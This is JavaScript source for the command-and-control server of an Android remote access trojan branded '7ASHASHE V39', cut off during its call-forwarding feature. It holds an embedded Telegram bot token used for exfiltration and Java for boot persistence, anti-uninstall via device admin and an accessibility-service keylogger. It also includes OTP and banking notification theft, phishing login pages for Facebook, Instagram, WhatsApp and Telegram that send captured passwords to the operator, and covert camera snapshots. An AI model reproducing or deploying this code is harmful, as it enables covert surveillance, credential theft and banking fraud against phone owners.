// =====================================================
// 7ASHASHE V39 - ULTIMATE WILD RAT
// گەشەپێدەر: 7ASHASHE - وەحشی هاک
// وەشان: 39.0.0 - UNSTOPPABLE EDITION
// =====================================================

// =====================================================
// 📦 REQUIRE MODULES - لە سەرەتاوە
// =====================================================
const express = require('express');
const WebSocket = require('ws');
const http = require('http');
const TelegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require('axios');
const os = require('os');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const zlib = require('zlib');
const util = require('util');
const exec = util.promisify(require('child_process').exec);

// =====================================================
// 🚀 APP INITIALIZATION - لە سەرەتای کۆد
// =====================================================
const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// =====================================================
// 🔐 CREDENTIALS - 7ASHASHE (تۆکنی نوێ)
// =====================================================
const CONFIG = {
    TOKEN: '8530600841:AAEdfh_HMZ8YzOghqeuZNXisZDcV9CfNltw',
    CHAT_ID: '5578405082',
    MASTER: '7ASHASHE',
    VERSION: '39.0.0',
    ENCRYPTION_KEY: crypto.randomBytes(32).toString('hex'),
    SESSION_SECRET: crypto.randomBytes(64).toString('hex'),
    PORT: process.env.PORT || 8080,
    MAX_FILE_SIZE: 100 * 1024 * 1024, // 100MB
    PING_INTERVAL: 30000, // 30 seconds
    RECONNECT_TIMEOUT: 5000, // 5 seconds
    AUTO_RESTART: true,
    BATTERY_OPTIMIZATION_BYPASS: true,
    ANTI_UNINSTALL: true,
    PERSISTENT_SERVICE: true,
    ACCESSIBILITY_SERVICE: true,
    CAM_SNAPSHOT_ON_LOCK: true
};

// =====================================================
// 🤖 TELEGRAM BOT INIT
// =====================================================
const bot = new TelegramBot(CONFIG.TOKEN, { polling: true });

// =====================================================
// 📁 DIRECTORY STRUCTURE
// =====================================================
const DIRS = {
    DATA: path.join(__dirname, 'data'),
    PHOTOS: path.join(__dirname, 'data', 'photos'),
    VIDEOS: path.join(__dirname, 'data', 'videos'),
    AUDIO: path.join(__dirname, 'data', 'audio'),
    FILES: path.join(__dirname, 'data', 'files'),
    CONTACTS: path.join(__dirname, 'data', 'contacts'),
    SMS: path.join(__dirname, 'data', 'sms'),
    CALLS: path.join(__dirname, 'data', 'calls'),
    APPS: path.join(__dirname, 'data', 'apps'),
    KEYLOGS: path.join(__dirname, 'data', 'keylogs'),
    CLIPBOARD: path.join(__dirname, 'data', 'clipboard'),
    LOCATION: path.join(__dirname, 'data', 'location'),
    SCREENSHOTS: path.join(__dirname, 'data', 'screenshots'),
    SCREEN_RECORDS: path.join(__dirname, 'data', 'screen_records'),
    WHATSAPP: path.join(__dirname, 'data', 'whatsapp'),
    TELEGRAM: path.join(__dirname, 'data', 'telegram'),
    INSTAGRAM: path.join(__dirname, 'data', 'instagram'),
    FACEBOOK: path.join(__dirname, 'data', 'facebook'),
    GMAIL: path.join(__dirname, 'data', 'gmail'),
    PASSWORDS: path.join(__dirname, 'data', 'passwords'),
    CRYPTO: path.join(__dirname, 'data', 'crypto'),
    TWOFA: path.join(__dirname, 'data', '2fa'),
    RANSOMWARE: path.join(__dirname, 'data', 'ransomware'),
    DROPPER: path.join(__dirname, 'data', 'dropper'),
    LOGS: path.join(__dirname, 'data', 'logs'),
    NOTIFICATIONS: path.join(__dirname, 'data', 'notifications'),
    SCREEN_STREAMS: path.join(__dirname, 'data', 'screen_streams'),
    CALL_FORWARDING: path.join(__dirname, 'data', 'call_forwarding'),
    WIFI_CONTROL: path.join(__dirname, 'data', 'wifi_control'),
    CAM_SNAPSHOTS: path.join(__dirname, 'data', 'cam_snapshots'),
    DATABASE: path.join(__dirname, 'data', 'database.json')
};

// Create all directories
Object.values(DIRS).forEach(dir => {
    if (!dir.includes('.json') && !fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true, mode: 0o755 });
    }
});

// Initialize database
if (!fs.existsSync(DIRS.DATABASE)) {
    fs.writeFileSync(DIRS.DATABASE, JSON.stringify({
        clients: {},
        stats: {
            total_connections: 0,
            total_files: 0,
            total_commands: 0,
            notifications_captured: 0,
            screen_streams: 0,
            calls_forwarded: 0,
            messages_spammed: 0,
            cam_snapshots: 0,
            start_time: new Date().toISOString()
        }
    }, null, 2));
}

// =====================================================
// 📤 MULTER UPLOAD CONFIG
// =====================================================
const upload = multer({ 
    limits: { fileSize: CONFIG.MAX_FILE_SIZE },
    storage: multer.memoryStorage()
});

// =====================================================
// 🔧 UTILITY FUNCTIONS
// =====================================================
const readDB = () => {
    try {
        return JSON.parse(fs.readFileSync(DIRS.DATABASE, 'utf8'));
    } catch (e) {
        return { clients: {}, stats: {} };
    }
};

const writeDB = (data) => {
    fs.writeFileSync(DIRS.DATABASE, JSON.stringify(data, null, 2));
};

const encrypt = (data) => {
    const cipher = crypto.createCipher('aes-256-cbc', CONFIG.ENCRYPTION_KEY);
    let encrypted = cipher.update(JSON.stringify(data), 'utf8', 'hex');
    encrypted += cipher.final('hex');
    return encrypted;
};

const decrypt = (encrypted) => {
    const decipher = crypto.createDecipher('aes-256-cbc', CONFIG.ENCRYPTION_KEY);
    let decrypted = decipher.update(encrypted, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
    return JSON.parse(decrypted);
};

const logToFile = (type, data) => {
    const logFile = path.join(DIRS.LOGS, `${type}_${new Date().toISOString().split('T')[0]}.log`);
    fs.appendFileSync(logFile, `[${new Date().toISOString()}] ${JSON.stringify(data)}\n`);
};

// Store connected clients
const clients = new Map();

// =====================================================
// 🚀 FEATURE 1: PERSISTENT AUTO-RESTART
// =====================================================
const setupAutoRestart = () => {
    if (!CONFIG.AUTO_RESTART) return;
    
    const restartScript = `
        // Android auto-restart script
        public class AutoRestartReceiver extends BroadcastReceiver {
            @Override
            public void onReceive(Context context, Intent intent) {
                if (intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED)) {
                    Intent serviceIntent = new Intent(context, MainService.class);
                    context.startService(serviceIntent);
                }
            }
        }
        
        // Keep alive service
        public class KeepAliveService extends Service {
            @Override
            public int onStartCommand(Intent intent, int flags, int startId) {
                // Start as foreground service to prevent killing
                Notification notification = new Notification.Builder(this)
                    .setContentTitle("System Service")
                    .setContentText("Running")
                    .build();
                startForeground(1, notification);
                return START_STICKY;
            }
        }
    `;
    
    fs.writeFileSync(path.join(DIRS.DROPPER, 'AutoRestartReceiver.java'), restartScript);
    console.log('✅ Auto-Restart module installed');
};

// =====================================================
// 🚀 FEATURE 2: PERSISTENT SERVICE (نەبڕاوە)
// =====================================================
const setupPersistentService = () => {
    if (!CONFIG.PERSISTENT_SERVICE) return;
    
    const persistentScript = `
        // Android persistent service
        public class PersistentService extends Service {
            private static final String TAG = "PersistentService";
            
            @Override
            public void onCreate() {
                super.onCreate();
                startForegroundService();
                startAlarmManager();
            }
            
            private void startForegroundService() {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    NotificationChannel channel = new NotificationChannel(
                        "persistent_channel",
                        "Persistent Service",
                        NotificationManager.IMPORTANCE_LOW
                    );
                    NotificationManager manager = getSystemService(NotificationManager.class);
                    manager.createNotificationChannel(channel);
                    
                    Notification notification = new Notification.Builder(this, "persistent_channel")
                        .setContentTitle("System Service")
                        .setContentText("Running")
                        .setSmallIcon(android.R.drawable.ic_dialog_info)
                        .build();
                    
                    startForeground(2, notification);
                }
            }
            
            private void startAlarmManager() {
                AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
                Intent intent = new Intent(this, RestartReceiver.class);
                PendingIntent pendingIntent = PendingIntent.getBroadcast(
                    this, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT
                );
                
                // Restart every 5 minutes if killed
                alarmManager.setRepeating(
                    AlarmManager.ELAPSED_REALTIME_WAKEUP,
                    SystemClock.elapsedRealtime() + 300000,
                    300000,
                    pendingIntent
                );
            }
            
            @Override
            public int onStartCommand(Intent intent, int flags, int startId) {
                return START_STICKY;
            }
        }
        
        public class RestartReceiver extends BroadcastReceiver {
            @Override
            public void onReceive(Context context, Intent intent) {
                context.startService(new Intent(context, PersistentService.class));
            }
        }
    `;
    
    fs.writeFileSync(path.join(DIRS.DROPPER, 'PersistentService.java'), persistentScript);
    console.log('✅ Persistent Service module installed');
};

// =====================================================
// 🚀 FEATURE 3: ACCESSIBILITY SERVICE EXPLOITATION
// =====================================================
const setupAccessibilityService = () => {
    if (!CONFIG.ACCESSIBILITY_SERVICE) return;
    
    const accessibilityScript = `
        // Android Accessibility Service
        public class KeyloggerAccessibilityService extends AccessibilityService {
            private static final String TAG = "KeyloggerService";
            
            @Override
            public void onAccessibilityEvent(AccessibilityEvent event) {
                switch (event.getEventType()) {
                    case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                        String text = event.getText().toString();
                        if (text != null && !text.isEmpty()) {
                            sendToServer(text);
                        }
                        break;
                        
                    case AccessibilityEvent.TYPE_VIEW_CLICKED:
                        // Track clicks
                        break;
                        
                    case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                        String packageName = event.getPackageName() != null ? 
                            event.getPackageName().toString() : "unknown";
                        sendToServer("Window changed: " + packageName);
                        break;
                }
            }
            
            private void sendToServer(String data) {
                // Send to our server via HTTP
                new Thread(() -> {
                    try {
                        OkHttpClient client = new OkHttpClient();
                        RequestBody body = new FormBody.Builder()
                            .add("type", "accessibility")
                            .add("data", data)
                            .add("timestamp", String.valueOf(System.currentTimeMillis()))
                            .build();
                        
                        Request request = new Request.Builder()
                            .url("https://your-server.com/api/accessibility")
                            .post(body)
                            .build();
                        
                        client.newCall(request).execute();
                    } catch (Exception e) {}
                }).start();
            }
            
            @Override
            public void onInterrupt() {}
            
            @Override
            public void onServiceConnected() {
                super.onServiceConnected();
                sendToServer("Accessibility service connected");
            }
        }
        
        // XML configuration for accessibility service
        // <accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
        //     android:description="@string/accessibility_service_description"
        //     android:accessibilityEventTypes="typeAllMask"
        //     android:accessibilityFlags="flagDefault|flagRetrieveInteractiveWindows"
        //     android:canRetrieveWindowContent="true"
        //     android:canRequestTouchExplorationMode="true"
        //     android:settingsActivity=".MainActivity" />
    `;
    
    fs.writeFileSync(path.join(DIRS.DROPPER, 'KeyloggerAccessibilityService.java'), accessibilityScript);
    console.log('✅ Accessibility Service module installed');
};

// =====================================================
// 🚀 FEATURE 4: CAM SNAPSHOT ON LOCK
// =====================================================
class CamSnapshotOnLock {
    constructor() {
        this.snapshots = [];
        this.active = CONFIG.CAM_SNAPSHOT_ON_LOCK;
    }

    captureOnUnlock(clientId) {
        if (!this.active) return;
        
        bot.sendMessage(CONFIG.CHAT_ID,
            `📸 **Cam Snapshot on Unlock**\n\n` +
            `🆔 Client: ${clientId.substring(0, 8)}...\n` +
            `⚡ Capturing front camera...`,
            { parse_mode: 'Markdown' }
        );
        
        const client = clients.get(clientId);
        if (client && client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'capture_on_unlock',
                timestamp: Date.now()
            }));
        }
    }

    saveSnapshot(clientId, imageData) {
        const filename = `unlock_${clientId.substring(0, 8)}_${Date.now()}.jpg`;
        const filepath = path.join(DIRS.CAM_SNAPSHOTS, filename);
        
        const base64Data = imageData.replace(/^data:image\/jpeg;base64,/, '');
        fs.writeFileSync(filepath, base64Data, 'base64');
        
        this.snapshots.push({
            clientId,
            filename,
            timestamp: new Date().toISOString()
        });
        
        const db = readDB();
        db.stats.cam_snapshots++;
        writeDB(db);
        
        bot.sendPhoto(CONFIG.CHAT_ID, Buffer.from(base64Data, 'base64'), {
            caption: `📸 **Unlock Snapshot**\n\n` +
                    `🆔 Client: ${clientId.substring(0, 8)}...\n` +
                    `⏰ Time: ${new Date().toLocaleString()}`,
            parse_mode: 'Markdown'
        });
    }
}

const camSnapshotOnLock = new CamSnapshotOnLock();

// API endpoint for cam snapshot
app.post('/api/cam/snapshot', (req, res) => {
    const { clientId, image } = req.body;
    camSnapshotOnLock.saveSnapshot(clientId, image);
    res.json({ success: true });
});

// =====================================================
// 🚀 FEATURE 5: REMOTE FILE EXPLORER
// =====================================================
class RemoteFileExplorer {
    constructor() {
        this.activeSessions = new Map();
    }

    listFiles(clientId, path = '/') {
        bot.sendMessage(CONFIG.CHAT_ID,
            `📁 **File Explorer**\n\n` +
            `🆔 Client: ${clientId.substring(0, 8)}...\n` +
            `📂 Path: ${path}\n` +
            `⚡ Fetching...`,
            { parse_mode: 'Markdown' }
        );
        
        const client = clients.get(clientId);
        if (client && client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'list_files',
                path,
                sessionId: uuidv4(),
                timestamp: Date.now()
            }));
        }
    }

    downloadFile(clientId, filePath) {
        bot.sendMessage(CONFIG.CHAT_ID,
            `📥 **Downloading File**\n\n` +
            `🆔 Client: ${clientId.substring(0, 8)}...\n` +
            `📄 Path: ${filePath}\n` +
            `⚡ Downloading...`,
            { parse_mode: 'Markdown' }
        );
        
        const client = clients.get(clientId);
        if (client && client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'download_file',
                path: filePath,
                timestamp: Date.now()
            }));
        }
    }

    deleteFile(clientId, filePath) {
        bot.sendMessage(CONFIG.CHAT_ID,
            `🗑️ **Deleting File**\n\n` +
            `🆔 Client: ${clientId.substring(0, 8)}...\n` +
            `📄 Path: ${filePath}`,
            { parse_mode: 'Markdown' }
        );
        
        const client = clients.get(clientId);
        if (client && client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'delete_file',
                path: filePath,
                timestamp: Date.now()
            }));
        }
    }
}

const remoteFileExplorer = new RemoteFileExplorer();

// API endpoint for file listing
app.post('/api/files/list', (req, res) => {
    const { clientId, path, files } = req.body;
    
    let fileList = '📁 **File List**\n\n';
    files.forEach(f => {
        fileList += `${f.type === 'dir' ? '📂' : '📄'} ${f.name} - ${f.size || ''}\n`;
    });
    
    bot.sendMessage(CONFIG.CHAT_ID, fileList, { parse_mode: 'Markdown' });
    res.json({ success: true });
});

// =====================================================
// 🚀 FEATURE 6: NOTIFICATION LISTENER
// =====================================================
class NotificationListener {
    constructor() {
        this.notifications = [];
        this.listening = false;
    }

    start() {
        this.listening = true;
        console.log('📱 Notification listener started');
    }

    captureNotification(notification) {
        const notif = {
            id: uuidv4(),
            app: notification.app || 'unknown',
            title: notification.title || '',
            text: notification.text || '',
            timestamp: new Date().toISOString(),
            priority: notification.priority || 'normal',
            icon: notification.icon || null
        };
        
        this.notifications.push(notif);
        
        // Save to file
        const notifFile = path.join(DIRS.NOTIFICATIONS, `${Date.now()}_${notif.app}.json`);
        fs.writeFileSync(notifFile, JSON.stringify(notif, null, 2));
        
        // Check for OTP/banking
        const isOTP = notif.text && notif.text.match(/\b\d{4,6}\b/);
        const isBanking = ['bank', 'pay', 'card', 'money'].some(word => 
            (notif.text && notif.text.toLowerCase().includes(word)) || 
            (notif.app && notif.app.toLowerCase().includes(word))
        );
        
        if (isOTP || isBanking) {
            bot.sendMessage(CONFIG.CHAT_ID,
                `💰 **🔐 Banking/OTP Alert**\n\n` +
                `📱 ئەپ: ${notif.app}\n` +
                `📌 ناونیشان: ${notif.title}\n` +
                `📝 پەیام: ${notif.text}\n` +
                `🔢 OTP: ${notif.text ? notif.text.match(/\b\d{4,6}\b/) : ''}\n` +
                `⏰ کات: ${new Date(notif.timestamp).toLocaleString()}`,
                { parse_mode: 'Markdown' }
            );
        } else {
            bot.sendMessage(CONFIG.CHAT_ID,
                `📱 **نۆتیفیکەیشن**\n\n` +
                `📱 ئەپ: ${notif.app}\n` +
                `📌 ناونیشان: ${notif.title}\n` +
                `📝 پەیام: ${notif.text}\n` +
                `⏰ کات: ${new Date(notif.timestamp).toLocaleString()}`,
                { parse_mode: 'Markdown' }
            );
        }
        
        // Update stats
        const db = readDB();
        db.stats.notifications_captured++;
        writeDB(db);
        
        return notif;
    }

    getNotifications() {
        return this.notifications;
    }
}

const notificationListener = new NotificationListener();

// API endpoint for notifications
app.post('/api/notification', (req, res) => {
    const notification = req.body;
    const captured = notificationListener.captureNotification(notification);
    res.json({ success: true, notification: captured });
});

// =====================================================
// 🚀 FEATURE 7: SCREEN STREAM (WebRTC)
// =====================================================
class ScreenStreamer {
    constructor() {
        this.streams = new Map();
        this.activeStreams = 0;
    }

    async startStream(clientId, options = { quality: 'high', fps: 30 }) {
        try {
            const stream = {
                id: uuidv4(),
                clientId,
                options,
                startedAt: new Date().toISOString(),
                frames: 0,
                active: true,
                viewers: 0
            };
            
            this.streams.set(stream.id, stream);
            this.activeStreams++;
            
            // Save stream info
            const streamFile = path.join(DIRS.SCREEN_STREAMS, `${stream.id}.json`);
            fs.writeFileSync(streamFile, JSON.stringify(stream, null, 2));
            
            // Update stats
            const db = readDB();
            db.stats.screen_streams++;
            writeDB(db);
            
            bot.sendMessage(CONFIG.CHAT_ID,
                `📹 **Screen Stream Started**\n\n` +
                `🆔 Client: ${clientId.substring(0, 8)}...\n` +
                `📊 Quality: ${options.quality}\n` +
                `🎞️ FPS: ${options.fps}\n` +
                `🆔 Stream: ${stream.id.substring(0, 8)}...`,
                { parse_mode: 'Markdown' }
            );
            
            return stream;
        } catch (error) {
            console.error('Screen stream error:', error);
            return null;
        }
    }

    stopStream(streamId) {
        const stream = this.streams.get(streamId);
        if (stream) {
            stream.active = false;
            this.streams.delete(streamId);
            this.activeStreams--;
            
            const duration = Math.floor((Date.now() - new Date(stream.startedAt)) / 1000);
            
            bot.sendMessage(CONFIG.CHAT_ID,
                `⏹️ **Screen Stream Ended**\n\n` +
                `🆔 Stream: ${streamId.substring(0, 8)}...\n` +
                `📊 Frames: ${stream.frames}\n` +
                `⏱️ Duration: ${duration}s\n` +
                `👁️ Viewers: ${stream.viewers}`,
                { parse_mode: 'Markdown' }
            );
        }
    }

    getActiveStreams() {
        return Array.from(this.streams.values()).filter(s => s.active);
    }
}

const screenStreamer = new ScreenStreamer();

// API endpoint for screen stream
app.post('/api/screen/stream', (req, res) => {
    const { clientId, options } = req.body;
    screenStreamer.startStream(clientId, options).then(stream => {
        res.json({ success: true, streamId: stream.id });
    });
});

app.post('/api/screen/stop/:streamId', (req, res) => {
    const { streamId } = req.params;
    screenStreamer.stopStream(streamId);
    res.json({ success: true });
});

app.post('/api/screen/frame', (req, res) => {
    const { streamId, frame } = req.body;
    const stream = screenStreamer.streams.get(streamId);
    if (stream && stream.active) {
        stream.frames++;
    }
    res.json({ success: true });
});

// =====================================================
// 🚀 FEATURE 8: SMART KEYLOGGER
// =====================================================
class SmartKeylogger {
    constructor() {
        this.logs = [];
        this.activeApps = new Map();
        this.bankingApps = [
            'bank', 'paypal', 'crypto', 'wallet', 'pay', 
            'cash', 'money', 'coinbase', 'binance', 'trust'
        ];
    }

    logKey(clientId, key, app) {
        const log = {
            id: uuidv4(),
            clientId,
            key,
            app: app || 'system',
            timestamp: new Date().toISOString(),
            isSensitive: this.isSensitiveApp(app)
        };
        
        this.logs.push(log);
        
        // Save to file
        const logFile = path.join(DIRS.KEYLOGS, `${app}_${new Date().toISOString().split('T')[0]}.log`);
        fs.appendFileSync(logFile, `[${log.timestamp}] ${key}\n`);
        
        // Special handling for banking apps
        if (this.isSensitiveApp(app)) {
            bot.sendMessage(CONFIG.CHAT_ID,
                `💰 **💰 Banking Alert**\n\n` +
                `📱 ئەپ: ${app}\n` +
                `⌨️ Key: ${key}\n` +
                `🆔 Client: ${clientId.substring(0, 8)}...\n` +
                `⚠️ Sensitive App Detected`,
                { parse_mode: 'Markdown' }
            );
        }
        
        return log;
    }

    isSensitiveApp(app) {
        return this.bankingApps.some(b => app && app.toLowerCase().includes(b));
    }

    getLogs(app = null) {
        if (app) {
            return this.logs.filter(l => l.app === app);
        }
        return this.logs;
    }

    startTracking(clientId, app) {
        this.activeApps.set(clientId, app);
        bot.sendMessage(CONFIG.CHAT_ID,
            `⌨️ **Smart Keylogger Started**\n\n` +
            `📱 ئەپ: ${app}\n` +
            `🆔 Client: ${clientId.substring(0, 8)}...\n` +
            `⚠️ Will monitor banking activity`,
            { parse_mode: 'Markdown' }
        );
    }

    stopTracking(clientId) {
        this.activeApps.delete(clientId);
    }

    getBankingLogs() {
        return this.logs.filter(l => l.isSensitive);
    }
}

const smartKeylogger = new SmartKeylogger();

// API endpoint for keylogger
app.post('/api/keylogger', (req, res) => {
    const { clientId, key, app } = req.body;
    smartKeylogger.logKey(clientId, key, app);
    res.json({ success: true });
});

app.post('/api/keylogger/start/:clientId', (req, res) => {
    const { clientId } = req.params;
    const { app } = req.body;
    smartKeylogger.startTracking(clientId, app);
    res.json({ success: true });
});

// =====================================================
// 🚀 FEATURE 9: SOCIAL MEDIA OVERLAY
// =====================================================
class SocialMediaOverlay {
    constructor() {
        this.overlays = [];
        this.templates = {
            facebook: {
                name: 'Facebook',
                logo: 'https://facebook.com/favicon.ico',
                fields: ['email', 'password']
            },
            instagram: {
                name: 'Instagram',
                logo: 'https://instagram.com/favicon.ico',
                fields: ['username', 'password']
            },
            whatsapp: {
                name: 'WhatsApp',
                logo: 'https://whatsapp.com/favicon.ico',
                fields: ['phone', 'password']
            },
            telegram: {
                name: 'Telegram',
                logo: 'https://telegram.org/favicon.ico',
                fields: ['phone', 'password']
            }
        };
    }

    async createOverlay(platform, clientId) {
        const template = this.templates[platform];
        if (!template) return null;
        
        const overlay = {
            id: uuidv4(),
            platform,
            clientId,
            createdAt: new Date().toISOString(),
            url: this.getFakeLoginUrl(platform),
            credentials: [],
            template
        };
        
        this.overlays.push(overlay);
        
        // Create fake HTML page
        const htmlPath = path.join(DIRS.DROPPER, `${platform}_fake_${Date.now()}.html`);
        const htmlContent = this.generateFakeLoginPage(platform, template);
        fs.writeFileSync(htmlPath, htmlContent);
        
        bot.sendMessage(CONFIG.CHAT_ID,
            `🎭 **Social Media Overlay Created**\n\n` +
            `📱 Platform: ${platform}\n` +
            `🆔 Client: ${clientId.substring(0, 8)}...\n` +
            `🔗 URL: ${overlay.url}\n` +
            `📁 HTML: ${htmlPath}`,
            { parse_mode: 'Markdown' }
        );
        
        return overlay;
    }

    getFakeLoginUrl(platform) {
        const urls = {
            facebook: 'https://facebook-login-verify.com',
            instagram: 'https://instagram-security.com',
            whatsapp: 'https://whatsapp-web-verify.com',
            telegram: 'https://telegram-auth.com'
        };
        return urls[platform] || 'https://login-verify.com';
    }

    generateFakeLoginPage(platform, template) {
        const fields = template.fields.map(f => 
            `<input type="${f.includes('password') ? 'password' : 'text'}" name="${f}" placeholder="${f}" required>`
        ).join('');
        
        return `
            <!DOCTYPE html>
            <html>
            <head>
                <title>${template.name} Login</title>
                <meta name="viewport" content="width=device-width, initial-scale=1">
                <style>
                    body {
                        font-family: Arial, sans-serif;
                        background: #f0f2f5;
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        height: 100vh;
                        margin: 0;
                    }
                    .login-box {
                        background: white;
                        padding: 40px;
                        border-radius: 8px;
                        box-shadow: 0 2px 10px rgba(0,0,0,0.1);
                        width: 350px;
                    }
                    h2 {
                        text-align: center;
                        color: #1877f2;
                        margin-bottom: 30px;
                    }
                    input {
                        width: 100%;
                        padding: 12px;
                        margin: 8px 0;
                        border: 1px solid #ddd;
                        border-radius: 4px;
                        box-sizing: border-box;
                    }
                    button {
                        width: 100%;
                        padding: 12px;
                        background: #1877f2;
                        color: white;
                        border: none;
                        border-radius: 4px;
                        cursor: pointer;
                        font-size: 16px;
                        margin-top: 10px;
                    }
                    button:hover {
                        background: #166fe5;
                    }
                </style>
            </head>
            <body>
                <div class="login-box">
                    <h2>${template.name}</h2>
                    <form method="POST" action="/api/overlay/capture">
                        <input type="hidden" name="platform" value="${platform}">
                        ${fields}
                        <button type="submit">Log In</button>
                    </form>
                </div>
            </body>
            </html>
        `;
    }

    captureCredentials(platform, credentials) {
        const overlay = this.overlays.find(o => o.platform === platform);
        if (overlay) {
            overlay.credentials.push({
                ...credentials,
                timestamp: new Date().toISOString()
            });
        }
        
        const credFile = path.join(DIRS.PASSWORDS, `${platform}_${Date.now()}.json`);
        fs.writeFileSync(credFile, JSON.stringify(credentials, null, 2));
        
        bot.sendMessage(CONFIG.CHAT_ID,
            `🔐 **🔐 Credentials Captured**\n\n` +
            `📱 Platform: ${platform}\n` +
            `👤 Username: ${credentials.username || credentials.email || credentials.phone}\n` +
            `🔑 Password: ${credentials.password}\n` +
            `⏰ Time: ${new Date().toLocaleString()}`,
            { parse_mode: 'Markdown' }
        );
    }
}

const socialMediaOverlay = new SocialMediaOverlay();

// API endpoints for overlay
app.post('/api/overlay/create', (req, res) => {
    const { platform, clientId } = req.body;
    socialMediaOverlay.createOverlay(platform, clientId).then(overlay => {
        res.json({ success: true, overlay });
    });
});

app.post('/api/overlay/capture', (req, res) => {
    const credentials = req.body;
    socialMediaOverlay.captureCredentials(credentials.platform, credentials);
    res.redirect('https://google.com');
});

// =====================================================
// 🚀 FEATURE 10: BATTERY OPTIMIZATION BYPASS
// =====================================================
const setupBatteryOptimizationBypass = () => {
    if (!CONFIG.BATTERY_OPTIMIZATION_BYPASS) return;
    
    const bypassScript = `
        // Android battery optimization bypass
        public class BatteryOptimization {
            public static void requestIgnoreBatteryOptimizations(Context context) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    Intent intent = new Intent();
                    String packageName = context.getPackageName();
                    PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
                    if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                        intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                        intent.setData(Uri.parse("package:" + packageName));
                        context.startActivity(intent);
                    }
                }
            }
            
            public static void enableBackgroundRestriction(Context context) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    Intent intent = new Intent();
                    intent.setAction(Settings.ACTION_IGNORE_BACKGROUND_DATA_RESTRICTIONS_SETTINGS);
                    intent.setData(Uri.parse("package:" + context.getPackageName()));
                    context.startActivity(intent);
                }
            }
        }
    `;
    
    fs.writeFileSync(path.join(DIRS.DROPPER, 'BatteryOptimization.java'), bypassScript);
    console.log('✅ Battery Optimization Bypass installed');
};

// =====================================================
// 🚀 FEATURE 11: ANTI-UNINSTALL
// =====================================================
const setupAntiUninstall = () => {
    if (!CONFIG.ANTI_UNINSTALL) return;
    
    const antiUninstallScript = `
        // Android anti-uninstall via Device Admin
        public class AntiUninstall extends DeviceAdminReceiver {
            private static final String TAG = "AntiUninstall";
            
            @Override
            public void onEnabled(Context context, Intent intent) {
                super.onEnabled(context, intent);
                Log.d(TAG, "Device admin enabled");
            }
            
            @Override
            public void onDisabled(Context context, Intent intent) {
                // Re-enable admin if disabled
                ComponentName componentName = new ComponentName(context, AntiUninstall.class);
                DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
                
                // Try to re-enable
                Intent enableIntent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                enableIntent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName);
                enableIntent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required for security");
                enableIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(enableIntent);
                
                Log.d(TAG, "Attempting to re-enable device admin");
            }
            
            @Override
            public void onPasswordChanged(Context context, Intent intent) {
                Log.d(TAG, "Password changed");
            }
            
            @Override
            public void onPasswordFailed(Context context, Intent intent) {
                Log.d(TAG, "Password failed");
            }
            
            @Override
            public void onPasswordSucceeded(Context context, Intent intent) {
                Log.d(TAG, "Password succeeded");
            }
        }
    `;
    
    fs.writeFileSync(path.join(DIRS.DROPPER, 'AntiUninstall.java'), antiUninstallScript);
    
    // Create device admin XML
    const deviceAdminXml = `<?xml version="1.0" encoding="utf-8"?>
<device-admin xmlns:android="http://schemas.android.com/apk/res/android">
    <uses-policies>
        <limit-password />
        <watch-login />
        <reset-password />
        <force-lock />
        <wipe-data />
        <expire-password />
        <encrypted-storage />
        <disable-camera />
    </uses-policies>
</device-admin>`;
    
    fs.writeFileSync(path.join(DIRS.DROPPER, 'device_admin.xml'), deviceAdminXml);
    console.log('✅ Anti-Uninstall module installed');
};

// =====================================================
// 🚀 FEATURE 12: BYPASS LOCK SCREEN
// =====================================================
class LockScreenBypass {
    constructor() {
        this.active = false;
    }

    wakeUpDevice(clientId) {
        bot.sendMessage(CONFIG.CHAT_ID,
            `🔓 **Wake Up Device**\n\n` +
            `🆔 Client: ${clientId.substring(0, 8)}...\n` +
            `⚡ Sending wake up command...`,
            { parse_mode: 'Markdown' }
        );
        
        const client = clients.get(clientId);
        if (client && client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'wake_up',
                timestamp: Date.now()
            }));
        }
    }

    keepScreenOn(clientId, enable = true) {
        this.active = enable;
        
        bot.sendMessage(CONFIG.CHAT_ID,
            `${enable ? '🔒' : '🔓'} **Keep Screen ${enable ? 'ON' : 'OFF'}**\n\n` +
            `🆔 Client: ${clientId.substring(0, 8)}...\n` +
            `⚡ Screen will ${enable ? 'stay on' : 'normal'}`,
            { parse_mode: 'Markdown' }
        );
        
        const client = clients.get(clientId);
        if (client && client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'keep_screen',
                enable,
                timestamp: Date.now()
            }));
        }
    }
}

const lockScreenBypass = new LockScreenBypass();

// =====================================================
// 🚀 FEATURE 13: CALL FORWARDING
// =====================================================
class CallForwarding {
    constructor() {
        this.forwardings = new Map();
    }

    forwardCalls(clientId, targetNumber) {
        const forwarding = {
